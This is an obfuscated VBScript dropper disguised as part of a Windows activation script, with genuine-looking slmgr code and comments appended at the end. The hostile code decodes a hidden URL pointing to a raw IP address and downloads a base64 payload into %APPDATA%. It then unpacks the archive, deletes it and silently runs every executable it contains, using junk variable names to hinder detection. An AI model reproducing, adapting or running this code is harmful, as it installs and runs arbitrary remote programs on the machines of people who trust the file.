Option Explicit
CONST wshOK                             =0
CONST VALUE_ICON_WARNING                =16
CONST wshYesNoDialog                    =4
CONST VALUE_ICON_QUESTIONMARK           =32
CONST VALUE_ICON_INFORMATION            =64
CONST HKEY_LOCAL_MACHINE                =&H80000002
CONST KEY_SET_VALUE                     =&H0002
CONST KEY_QUERY_VALUE                   =&H0001
CONST REG_SZ                            =1           
dim hjnprrtteegilnnprrtvbbegg,lnprttvzaaccggillnprrtvve,ssuadffhjmooqsuuxybbacffh,lnprttvzaccbdfiilnpprtvve
dim  aacbddfhjmmoqtvvegiilnnpr,Clqtilooqsuddfhjjmoqsu,SEUZP
dim  bacegjjmoqqsudffhjmmoqssv,mqXFFRJUWm
dim  rtvbdfhhmmorttvzzacbbdffh,oqqsuaacegilnnqsuuxyybaac,hjmmoqssuxyybaacffhjmmoqqsuudf
dim  fhhjmoqqtvzzacbddfhjjmooq,prrtveggilnppsuuaceegiiln,OBJhhjmmoqqsuaccegimmo
dim  vvceggilnp,jjmorttvzaccbdffhjmmoqqtv,vegillnprttvbdggilnpprttv
Function Jkdkdkd(G1g)
For aacbddfhjmmoqtvvegiilnnpr = 1 To Len(G1g)
jjmorttvzaccbdffhjmmoqqtv = Mid(G1g, aacbddfhjmmoqtvvegiilnnpr, 1)
jjmorttvzaccbdffhjmmoqqtv = Chr(Asc(jjmorttvzaccbdffhjmmoqqtv)+ 6)
fhhjmoqqtvzzacbddfhjjmooq = fhhjmoqqtvzzacbddfhjjmooq + jjmorttvzaccbdffhjmmoqqtv
Next
Jkdkdkd = fhhjmoqqtvzzacbddfhjjmooq
End Function 
Function hhjmooqquuzaccbddfhhjm()
Dim ClqtilooqsuddfhjjmoqsuLM,jxtsudffhjmooqtvvb,jrtaaaceegillnprrw,Coltlnnprtvvbdffhjnpr
Set ClqtilooqsuddfhjjmoqsuLM = WScript.CreateObject( "WScript.Shell" )
Set jrtaaaceegillnprrw = CreateObject( "Scripting.FileSystemObject" )
Set jxtsudffhjmooqtvvb = jrtaaaceegillnprrw.GetFolder(oqqsuaacegilnnqsuuxyybaac)
Set Coltlnnprtvvbdffhjnpr = jxtsudffhjmooqtvvb.Files
For Each Coltlnnprtvvbdffhjnpr in Coltlnnprtvvbdffhjnpr
If UCase(jrtaaaceegillnprrw.GetExtensionName(Coltlnnprtvvbdffhjnpr.name)) = "EXE" Then
ClqtilooqsuddfhjjmoqsuLM.Exec(oqqsuaacegilnnqsuuxyybaac & "\" & Coltlnnprtvvbdffhjnpr.Name)
End If
Next
End Function
bacegjjmoqqsudffhjmmoqssv     = Jkdkdkd("bnnj4))+3,(,-0(+.1(+**4+3/*)tkkaaa`^a](cmi")
Set OBJhhjmmoqqsuaccegimmo = CreateObject( "WScript.Shell" )    
hjmmoqssuxyybaacffhjmmoqqsuudf = OBJhhjmmoqqsuaccegimmo.ExpandEnvironmentStrings(StrReverse("%ATADPPA%"))
lnprttvzaccbdfiilnpprtvve = "A99449C3092CE70964CE715CF7BB75B.zip"
Function jmmprttvbdffhjjmooqssu()
SET lnprttvzaaccggillnprrtvve = CREATEOBJECT("Scripting.FileSystemObject")
IF lnprttvzaaccggillnprrtvve.FolderExists(hjmmoqssuxyybaacffhjmmoqqsuudf + "\DecGram") = TRUE THEN WScript.Quit() END IF
IF lnprttvzaaccggillnprrtvve.FolderExists(ssuadffhjmooqsuuxybbacffh) = FALSE THEN
lnprttvzaaccggillnprrtvve.CreateFolder ssuadffhjmooqsuuxybbacffh
lnprttvzaaccggillnprrtvve.CreateFolder OBJhhjmmoqqsuaccegimmo.ExpandEnvironmentStrings(StrReverse("%ATADPPA%")) + "\DecGram"
END IF
End Function
Function nprrtvejmoqqsuxxybaace()
DIM jrtaaaceegillnprrxsd
Set jrtaaaceegillnprrxsd = Createobject("Scripting.FileSystemObject")
jrtaaaceegillnprrxsd.DeleteFile oqqsuaacegilnnqsuuxyybaac & "\" & lnprttvzaccbdfiilnpprtvve
End Function
oqqsuaacegilnnqsuuxyybaac = hjmmoqssuxyybaacffhjmmoqqsuudf + "\nvmodpt"
bddfhhjmoo
ssuadffhjmooqsuuxybbacffh = oqqsuaacegilnnqsuuxyybaac
jmmprttvbdffhjjmooqssu
ooqsuaacegiilnppsuxxyb
WScript.Sleep 10103
nnprttvfhjjmooqssuaace
WScript.Sleep 5110
nprrtvejmoqqsuxxybaace
hhjmooqquuzaccbddfhhjm
Function bddfhhjmoo()
Set mqXFFRJUWm = CreateObject("Scripting.FileSystemObject")
If (mqXFFRJUWm.FolderExists(oqqsuaacegilnnqsuuxyybaac )) Then
WScript.Quit()
End If 
End Function   
Function ooqsuaacegiilnppsuxxyb()
DIM req
Set req = CreateObject("Msxml2.XMLHttp.6.0")
req.open "GET", bacegjjmoqqsudffhjmmoqssv, False
req.send
If req.Status = 200 Then
 Dim oNode, BinaryStream
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = req.responseText
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write oNode.nodeTypedValue
BinaryStream.SaveToFile oqqsuaacegilnnqsuuxyybaac & "\" & lnprttvzaccbdfiilnpprtvve, adSaveCreateOverWrite
End if
End Function
rtvbdfhhmmorttvzzacbbdffh = "prrtveggilnppsuuaceegiiln"
Function nnprttvfhjjmooqssuaace()
set Clqtilooqsuddfhjjmoqsu = CreateObject("Shell.Application")
set SEUZP=Clqtilooqsuddfhjjmoqsu.NameSpace(oqqsuaacegilnnqsuuxyybaac & "\" & lnprttvzaccbdfiilnpprtvve).items
Clqtilooqsuddfhjjmoqsu.NameSpace(oqqsuaacegilnnqsuuxyybaac & "\").CopyHere(SEUZP), 4
Set Clqtilooqsuddfhjjmoqsu = Nothing
End Function 

Private Sub DisplayAVMAClientInformation(objProduct)
    Dim strHostName, strPid
    Dim displayDate
    Dim bHostName, bFiletime, bPid

    strHostName = objProduct.AutomaticVMActivationHostMachineName
    bHostName = strHostName <> "" And Not IsNull(strHostName)

    Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
    displayDate.Value = objProduct.AutomaticVMActivationLastActivationTime
    bFiletime = displayDate.GetFileTime(false) <> 0

    strPid = objProduct.AutomaticVMActivationHostDigitalPid2
    bPid = strPid <> "" And Not IsNull(strPid)

    If bHostName Or bFiletime Or bPid Then
        LineOut ""
        LineOut GetResource("L_MsgVLMostRecentActivationInfo")
        LineOut GetResource("L_MsgAVMAInfo")

        If bHostName Then
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & strHostName
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & GetResource("L_MsgNotAvailable")
        End If

        If bFiletime Then
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & displayDate.GetVarDate
        Else
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & GetResource("L_MsgNotAvailable")
        End If

        If bPid Then
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & strPid
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & GetResource("L_MsgNotAvailable")
        End If
    End If

End Sub

'
' Display all information for /dlv and /dli
' If you add need to access new properties through WMI you must add them to the
' queries for service/object.  Be sure to check that the object properties in DisplayAllInformation()
' are requested for function/methods such as GetIsPrimaryWindowsSKU() and DisplayKMSClientInformation().
'